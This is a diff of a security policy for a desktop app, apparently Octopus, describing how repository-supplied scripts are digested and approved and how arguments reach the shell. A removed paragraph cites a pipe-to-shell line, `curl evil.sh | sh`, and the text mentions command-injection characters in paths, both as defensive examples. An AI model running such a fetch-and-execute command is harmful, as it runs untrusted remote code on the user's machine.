@@ -32,8 +32,8 @@ service of its own — so most of the usual surface does not exist. What does:
   hook honoured without that prompt is the most serious bug this project can
   have.
 - **A repository can supply the shell the Run button executes.** A checkout
-  carrying `.octopus/scripts/` or a `.conductor/` decides what runs, ahead of
-  anything configured in the app — so a `git pull` can change it.
+  carrying `.octopus/scripts/` decides what runs, ahead of anything configured
+  in the app — so a `git pull` can change it.
   `src/core/repoSource.ts` digests what the repository supplies and shows every
   version once before it runs; a project can be marked trusted, which turns that
   off deliberately and per project. A way to get a repository's script executed
@@ -41,24 +41,15 @@ service of its own — so most of the usual surface does not exist. What does:
   resolves outside the checkout, a source that skips the digest — is as serious
   as the item above, and for the same reason.
 
-  **One known limit, stated rather than implied.** A `.conductor` script is a
-  command line, not a file, so what is shown and digested is the line: approving
-  `./scripts/boot.sh` approves those characters, and a `git pull` rewriting that
-  file leaves the digest identical and the approval standing. It cannot be
-  closed by following the line — `repoTrust.ts` settled that rule for hooks,
-  since `curl evil.sh | sh` names no file, and there is no directory to digest
-  whole here. So the promise is narrowed instead: the card says the approval
-  covers the line and not what the line runs. A **file**-sourced script
-  (`.octopus/scripts/`) is exact, and a report about that one is the serious
-  case above.
+  A script is a file, so what is shown and digested is every byte of what runs:
+  a `git pull` rewriting it asks again.
 
 - **Anything reaching a process argument.** External commands go through
   `execFile` with an argument array, and values crossing IPC are parsed with zod
   at the boundary. A path that reaches an argument unvalidated — branch names
-  and project ids come from repository directory names — is worth reporting. The
-  one place a string is handed to a shell on purpose is a terminal's
-  `commandLine`, which has to reach `zsh -i -c` unquoted to be a command line at
-  all; everything about who may write one is the item above.
+  and project ids come from repository directory names — is worth reporting. A
+  terminal's argv is quoted argument by argument on its way to `zsh -i -c`, so
+  a path with a `;` or a `$(` in it is a name, not a command.
 - **Files written outside `~/.octopus`, the worktree, and `.octopus/` inside a
   project's checkout.** Those three are the whole of what the app is allowed to
   touch. The third is the narrowest and the newest: exporting a project's
